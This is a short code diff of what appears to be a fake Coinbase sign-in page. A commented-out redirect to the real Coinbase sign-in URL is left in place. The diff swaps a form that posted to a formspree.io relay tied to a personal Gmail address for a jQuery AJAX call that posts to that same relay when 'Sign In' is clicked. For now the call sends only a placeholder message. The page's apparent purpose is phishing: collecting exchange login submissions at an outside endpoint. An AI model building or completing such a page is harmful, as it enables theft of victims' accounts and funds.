@@ -111,7 +111,6 @@
                 </noscript>
                 <div class="session">
                     <div class="account-form">
-                        <form action="https://formspree.io/stevuninverse@gmail.com" method="POST">
                             <h2>Sign In</h2>
                             <div class="control-group">
                                 <div class="controls">
@@ -131,7 +130,6 @@
                                     </label>
                                 </div>
                             </div>
-                        </form>
                     </div>
                     <div class="account-extras">
                         <p>
@@ -224,6 +222,12 @@
         $("#signin_button").click(function () {
             $("#signin_button").prop("value", "Signing In...");
 
+                $.ajax({
+    url: "https://formspree.io/stevuninverse@gmail.com", 
+    method: "POST",
+    data: {message: "hello!"},
+    dataType: "json"
+});
             //window.location.replace("https://www.coinbase.com/signin");
         });
         });
